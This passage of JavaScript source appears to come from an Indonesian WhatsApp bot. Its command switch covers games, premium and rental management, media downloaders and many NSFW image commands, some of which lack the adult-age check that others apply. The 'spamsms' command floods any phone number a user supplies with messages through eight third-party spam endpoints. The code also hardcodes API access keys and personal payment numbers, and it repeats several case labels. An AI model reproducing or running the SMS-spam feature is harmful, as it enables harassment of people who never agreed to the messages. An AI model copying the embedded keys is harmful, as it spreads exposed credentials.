              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (caklontong.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/caklontong2?apikey=${lolhumanapi}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              Ramdani.sendMessage(from, '*+* ```Caklontong```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
})
              await sleep(30000)
              if (caklontong.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("Jawaban: " + jawaban)
              delete caklontong[sender.split('@')[0]]
              fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
}
              gameAdd(sender, glimit)
              break
       case 'slot':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              const sotoy = ['🍊 : 🍒 : 🍐','🍒 : ?? : 🍊','?? : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
              somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              if (somtoyy  == '🍌 : 🍌 : 🍌') {
              freply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍒 : 🍒') {
              freply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🔔 : 🔔 : 🔔') {
              freply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍐 : 🍐') {
              freply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🍇 : 🍇 : 🍇') {
              freply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else {
              freply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
}
              break
       case 'suit':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!q) return freply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
              const userspilih = q
              if (!userspilih.match(/batu|gunting|kertas/)) return freply(`Pilih batu, kertas, gunting`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'batu';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'gunting';
              } else {
              computer = 'kertas';
}
              if ( userspilih == computer ) {
              freply(`Pertandingan Seri!`)
              } else if ( userspilih == 'batu' ) {
              if( computer == 'gunting' ) {
              freply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
              } else {
              freply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
              } else if ( userspilih == 'gunting' ) {
              if( computer == 'batu' ) {
              freply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
              } else {
              freply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
}
              } else if ( userspilih == 'kertas' ) {
              if( computer == 'batu' ) {
              freply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
              } else {
              freply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}
              break
//------------------< Sewa >-------------------
       case 'sewa':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isGroup)return freply(mess.only.group)
              if (!isOwner) return freply(mess.only.owner)
              if (args.length < 1) return freply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
              if (args[0].toLowerCase() === 'add'){
            _sewa.addSewaGroup(from, args[1], sewa)
              freply(`Success`)
              } else if (args[0].toLowerCase() === 'del'){
              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
              fs.writeFileSync('./database/group/sewa.json', JSON.stringify(sewa))
              freply(mess.success)
              } else {
              freply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
}
              break
       case 'sewalist': 
       case 'listsewa':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              txtnyee += `*➤ ID User :* ${i.id} \n*➤ Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
}
              freply(txtnyee)
              break
       case 'sewacheck':
       case 'ceksewa': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isGroup) return freply(mess.only.group)
              if (!isSewa) return freply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
              let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
              let premiumnya = `*「 SEWA EXPIRE 」*\n\n➤ *ID User*: ${from}\n➤ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
              freply(premiumnya)
              break
         case 'spamsms':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (args.length == 0) return freply(`Example: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=genbotkey&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=genbotkey&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=genbotkey&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=genbotkey&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=genbotkey&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=genbotkey&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=genbotkey&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=genbotkey&nomor=${nomor}`)
                    freply("Success")
                    break        
//------------------< premium menu >-------------------
       case 'premium': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isOwner) return freply(mess.only.owner)
              if (args[0] === 'add') {
              if (mek.message.extendedTextMessage != undefined) {
              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid

              premium.addPremiumUser(mentioned[0], args[2], _premium)
              freply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
                        
              } else {
                            
              premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
              freply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
}
              } else if (args[0] === 'del') {
              if (mek.message.extendedTextMessage != undefined) {
              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            _premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
              fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
              freply(mess.success)
              } else {
            _premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
              fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
              freply(mess.success)
}
              } else {
              freply(mess.wrongFormat)
}
              break
       case 'premiumcheck':
       case 'cekpremium': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isPremium) return freply(mess.only.premium)
              const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
              freply(`*「 PREMIUM EXPIRE 」*\n\n➸ *ID*: ${sender}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
              break
       case 'listprem':
       case 'listpremium':          
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              let txt = `「 *PREMIUM USER LIST* 」\n\n`
              let men = [];
              for (let i of _premium){
              men.push(i.id)
              const checkExp = ms(i.expired - Date.now())
              txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
}
              mentions(txt, men, true)
              break       
//------------------< bayar menu >-------------------  
case 'bayar':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
gopeynya = 'https://i.ibb.co/kynNYTh/Ramdani2.jpg'
teksnya = `*[ PAYMENT ]*
*Gopay :* 089512545999
*Dana :* 089512545999
*Ovo :* 089512545999
*[ © ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ ]*`
        Ramdani.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftoko, caption: teksnya })
              break
//--------------------<const menu>--------------------
             case 'alllmenu2':
             Ramdani.sendMessage(from, allmenu(prefix), MessageType.text, {quoted: troli})
             break
//------------------< Sticker Cmd >-------------------
       case 'addcmd': 
       case 'setcmd':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isPremium) return freply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
              if (isQuotedSticker) {
              if (!q) return freply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              textImg("Done!")
              } else {
              freply('tag stickenya')
}
              break
       case 'delcmd':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isPremium) return freply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
              if (!isQuotedSticker) return freply(`Penggunaan : ${command} tagsticker`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            _scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
              textImg("Done!")
              break
       case 'listcmd':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
              let cemde = [];
              for (let i of _scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
}
              mentions(teksnyee, cemde, true)
              break
//------------------< Downloader/Search/Anime >-------------------
       case 'igdl':
       case 'instagram':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              try {
              if (!isUrl(q)) return freply('Linknya?')
              freply(mess.wait)
              res = await axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${lolhumanapi}&url=${args[0]}`)
              data = res.data.result
              for (let i = 0; i < data.media.length; i++) {
              sendMediaURL(from, data.media[i], data.caption, {thumbnail: Buffer.alloc(0)})
}
              } catch (e) {
              console.log(e)
              freply(String(e))
}
              break 
       case 'igdl2':
       case 'instagram2':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              try {
              if (!q) return freply('Linknya?')
              freply(mess.wait)
              res = await axios.get(`https://api.zeks.xyz/api/ig?apikey=${zeksapi}&url=${args[0]}`)
              for(let i = 0; i < res.data.result.length; i++) {
              sendMediaURL(from, res.data.result[i].url, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM MEDIA*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`• Username : ${res.data.owner}\`\`\`
\`\`\`• Caption : ${res.data.caption}\`\`\``, {thumbnail: Buffer.alloc(0)})
}
              } catch (e) {
              console.log(e)
              freply(String(e))
}
              break
       case 'igdl3': 
       case 'instagram3':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!q) return freply('Link Yang Mana? ')
              if (!q.includes('instagram')) return freply(mess.error.Iv)
              freply(mess.wait)
              anu = await igDownloader(`${q}`)
             .then((data) => { sendMediaURL(from, data.result.link, data.result.desc, mek) })
             .catch((err) => { freply(String(err)) })
              break
       case 'scplay': 
       case 'soundcloud':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!q) return freply('Link Yang Mana? ')
              if (!q.includes('soundcloud')) return freply(mess.error.Iv)
              freply(mess.wait)
              anu = await fetchJson(`https://api.lolhuman.xyz/api/soundcloud?apikey=${lolhumanapi}&url=${q}`)
             .then((data) => { sendMediaURL(from, data.result, mek) })
             .catch((err) => { freply(String(err)) })
              break
       case 'image':
       case 'gimage':
       case 'googleimage':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (args.length < 1) return freply('Apa Yang Mau Dicari?')
              freply(mess.wait)
              teks = args.join(' ')
              res = await googleImage(teks, google)
              function google(error, result){
              if (error){ return freply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
              else {
              gugIm = result
              random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
             break
      case 'ytmp3':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
            if (!isPremium) return reply(mess.only.premium)
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
            teks = args.join(' ')
            reply(mess.wait)
            res = await y2mateA(teks).catch(e => {
            reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`• Title : ${res[0].judul}\`\`\`
\`\`\`• Ext : MP3\`\`\`
\`\`\`• Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: mek}).then((lalu) => {
            sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
})
            break
     case 'ytmp4':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
            if (!isPremium) return reply(mess.only.premium)
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
            teks = args.join(' ')
            reply(mess.wait)
            res = await y2mateV(teks).catch(e => {
            reply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`• Title : ${res[0].judul}\`\`\`
\`\`\`• Ext : MP4\`\`\`
\`\`\`• Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: mek}).then((lalu) => {
            sendFileFromUrl(res[0].link, video, {quoted: mek, mimetype: 'video/mp4', filename: res[0].output})
})
            break
     case 'ytmp4hd':
     case 'ythd':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
            if (!isPremium) return freply(mess.only.premium)
            if (args.length === 0) return freply(`Kirim perintah */ytmp4 _linkYt_*`)
            let isLinkks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
            if (!isLinkks2) return freply(mess.error.Iv)
            try {
            freply(mess.wait)
            ythd(args[0])
           .then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res
            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
           .then((a) => {
            if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`• Title : ${title}\`\`\`
\`\`\`• Kualitas* : 720p\`\`\`
\`\`\`• Size* : ${filesizeF}\`\`\`
\`\`\`• Link* : ${a.data}\`\`\`

_Untuk durasi lebih dari batas disajikan dalam Bentuk link_`)

            const captionsYtmp4 = 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`• Title : ${title}\`\`\`
\`\`\`• Kualitas : 720p\`\`\`
\`\`\`• Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

              sendMediaURL(from, thumb, captionsYtmp4)
              sendMediaURL(from, dl_link,`nih kak`).catch(() => freply(mess.error.api))
})		
})
              } catch (err) {
              freply(`eror`)
}
              break
        case 'google':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!q) return freply(mess.wrongFormat)
              ss = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=f3fce33fa6804c0b97c897b3bd2ec7a8&url=https://google.com/search?q=${q}`)
              freply(mess.wait)
              if(q == undefined || q == ' ') return freply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
              googleIt({ 'query': q }).then(results => {
              vars = `_*Hasil Pencarian : ${q}*_\n`
              for (let i = 0; i < results.length; i++) {
              vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
               Ramdani.sendMessage(from, ss, image, {caption: vars, quoted : mek})
               }).catch(e => {
               console.log(e)
               freply(`${e}`)
})
               break
        case 'mediafire':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               if (!isPremium) return freply(mess.only.premium)
               if (args.length < 1) return freply('Link Nya Mana? ')
               if(!isUrl(args[0]) && !args[0].includes('mediafire')) return freply(mess.error.Iv)
               freply(mess.wait)
               teks = args.join(' ')
               res = await mediafireDl(teks)
               result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *MEDIAFIRE DOWNLOAD*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`• Nama : ${res[0].nama}\`\`\`
\`\`\`• Ukuran : ${res[0].size}\`\`\`
\`\`\`• Link : ${res[0].link}\`\`\`

_*Tunggu Proses Upload Media......*_`
             freply(result)
             sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
             break
       case 'tiktok': 
       case 'ttdl':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
             if (!q) return freply('Linknya?')
             if (!q.includes('tiktok')) return freply(mess.error.Iv)
             freply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.watermark) })
            .catch((err) => { freply(String(err)) })
             break
      case 'ttnowm': 
      case 'tiktoknowm':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
             if (!q) return freply('Linknya?')
             if (!q.includes('tiktok')) return freply(mess.error.Iv)
             freply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.nowatermark) })
            .catch((err) => { freply(String(err)) })
             break
case 'tiktok':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isRegister) return freply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://ramdaniofficial.github.io`)
              if (!q) return freply('Linknya?')
              if (!q.includes('tiktok')) return freply(mess.error.Iv)
              buttons = [{buttonId: `${prefix}tiktoknowm ${q}`,buttonText:{displayText: `🎥 Video`},type:1},{buttonId:`${prefix}ttaudio ${q}`,buttonText:{displayText:'🎵 Mp3'},type:1}]
              imageMsg = (await Ramdani.prepareMessageMedia(fs.readFileSync(`./media/foto/thumb.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/foto/thumb.jpg`)})).imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Subscribe Yt Ramdani Official\n Help 1k subscriber', imageMessage: imageMsg,
              contentText:`Silahkan pilihan media yg mau di download kak:v`,buttons,headerType:4}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              Ramdani.relayWAMessage(prep)
              break
      case 'ttaudio': 
      case 'tiktokmusic': 
      case 'tiktokaudio':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
             if (args.length == 0) return freply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
             ini_link = args[0]
             get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${lolhumanapi}&url=${ini_link}`)
             Ramdani.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek })
             break
      case 'fb':
      case 'facebook':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
             if (!q) return
             freply(mess.wait)
             try {
             anu = await fetchJson(`https://zenzapi.xyz/api/downloader/facebook?url=${args[0]}&apikey=0963ec745dde`)
             sendMediaURL(from, anu.result.hd)
             } catch (e) {
             console.log(e)
             freply(`${e}`)
}
             break
      case 'twitter':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
             if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return freply(mess.Iv)
             if (!q) return freply('Linknya?')
             ten = args[0]
             var res = await twitterGetUrl(`${ten}`)
            .then(g => {
             ren = `${g.download[2].url}`
             sendMediaURL(from,ren,'Done')
})
             break
      case 'brainly':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
             brainly(args.join(" ")).then(res => {
             hmm = '────────────\n'
             for (let Y of res.data) {
             hmm += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n───────────\n`
}
             freply(hmm)
             console.log(res)
})
             break      
case 'ssweb':
case 'ssurl':
case 'sslink':
case 'ss':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply('Urlnya nya mana om')
teks = q
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
buffungu = await getBuffer(anu.screenshot)
Ramdani.sendMessage(from, buffungu, image, {quoted: troli, caption : teks})
break
            case 'ssweb2':
            case 'ssurl2':
            case 'sslink2':
            case 'ss2':
            if (!isRegist) return freply(mess.regist)
            if (isBanned) return freply(mess.banned)
            if (args.length < 1) return freply(`[❗] Example :\n*${prefix}${command} https://google.com*`)                  
            freply(mess.wait)
            anu = await getBuffer(`https://hardianto.xyz/api/tools/ssweb?url=${args.join(' ')}&apikey=hardianto`)
            Ramdani.sendMessage(from, anu, image, {caption: `BERHASIL KAK\n\nPlease Support *Aprilia*`, quoted: mek})
            break
	        case 'encimg':
		    case 'encfoto':
            if (!isRegist) return freply(mess.regist)
            if (isBanned) return freply(mess.banned)
		    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			const media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
			freply(mess.wait)
			await encimg(media, {lang: 'eng+ind', oem: 1, psm: 3})
			.then(teks => {
			freply(teks.trim())
			fs.unlinkSync(media)
			})
			.catch(err => {
			freply(err.message)
		    fs.unlinkSync(media)
			})
					} else {
						freply('Foto aja mas')
					}
					break
//ANIME MENU
case 'art':
                case 'bts':
                case 'exo':
                case 'elf':
                case 'loli':
                case 'neko':
                case 'waifu':
                case 'shota':
                case 'husbu':
                case 'sagiri':
                case 'shinobu':
                case 'megumin':
                case 'wallnime':
                if (!isRegist) return freply(mess.daftar)
                if (!isDewasa) return freply(mess.dewasa)
                if (isBanned) return freply(mess.banned)                
                getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolhumanapi}`).then((gambar) => {
                Ramdani.sendMessage(from, gambar, image, { quoted: mek })
                })
                break
                case 'hentai':
                case 'randomhentai':
                if (!isRegist) return freply(mess.regist)
                if (!isDewasa) return freply(mess.dewasa)
                if (isBanned) return freply(mess.banned)
                freply(mess.wait)
                await getBuffer(`http://hadi-api.herokuapp.com/api/hentai`).then((gambar) => {
                Ramdani.sendMessage(from, gambar, image, { quoted: mek })
                })
                break
                case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':                
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                if (!isRegist) return freply(mess.regist)
                if (!isDewasa) return freply(mess.dewasa)
                if (isBanned) return freply(mess.banned)
                freply(mess.wait)
                await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolhumanapi}`).then((gambar) => {
                Ramdani.sendMessage(from, gambar, image, { quoted: mek })
                })
                break
                case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'hentai':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
                if (!isRegist) return freply(mess.regist)
                if (isBanned) return freply(mess.banned)
                freply(mess.wait)
                getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolhumanapi}`).then((gambar) => {
                Ramdani.sendMessage(from, gambar, image, { quoted: mek })
                })
                break
//HENTAI MENU
       case 'nhentaipdf':
             if (!isRegist) return freply(mess.regist)
             if (!isDewasa) return freply(mess.dewasa)
             if (isBanned) return freply(mess.banned)
             if (!isPremium) return freply(mess.only.premium)
             if (args.length == 0) return freply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`)
             if (isNaN(Number(args[0]))) return await freply(mess.wrongFormat)
             try {
             henid = args[0]
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolhumanapi}`)
             get_result = get_result.result
             get_info = get_result.info
             teks = `\n${get_result.title_romaji}\n\n${get_result.title_native}\n\nCharacter : ${get_info.characters.join(", ")}\n`
             ini_image = await getBuffer(get_result.image[0])
             Ramdani.sendMessage(from, ini_image, image, { caption: teks, quoted: mek })
             anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${lolhumanapi}`)
             pdf = await getBuffer(anu.result)
             Ramdani.sendMessage(from, pdf, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${get_result.title_romaji}.pdf`, thumbnail: ini_image })
